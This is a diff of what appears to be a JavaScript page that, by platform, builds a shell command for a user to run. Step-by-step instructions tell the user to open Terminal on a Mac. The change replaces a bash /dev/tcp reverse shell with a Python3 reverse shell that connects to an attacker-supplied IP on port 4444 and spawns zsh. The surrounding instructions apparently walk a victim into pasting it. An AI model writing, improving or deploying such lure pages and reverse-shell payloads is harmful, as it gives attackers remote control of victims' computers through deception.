@@ -35,8 +35,8 @@
 
             // 1. Detection Logic for Mac and Chromebook
             if (platform.includes('mac')) {
-                // macOS command: Uses a bash reverse shell
-                cmd = `bash -i >& /dev/tcp/${ip}/4444 0>&1`;
+                // macOS command: Updated to Python3 to avoid Zsh /dev/tcp limitations
+                cmd = `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/zsh')\"`;
                 instructions = `
                     1. Press <b>Command + Space</b> and type <b>Terminal</b>.<br>
                     2. Press <b>Enter</b>.<br>
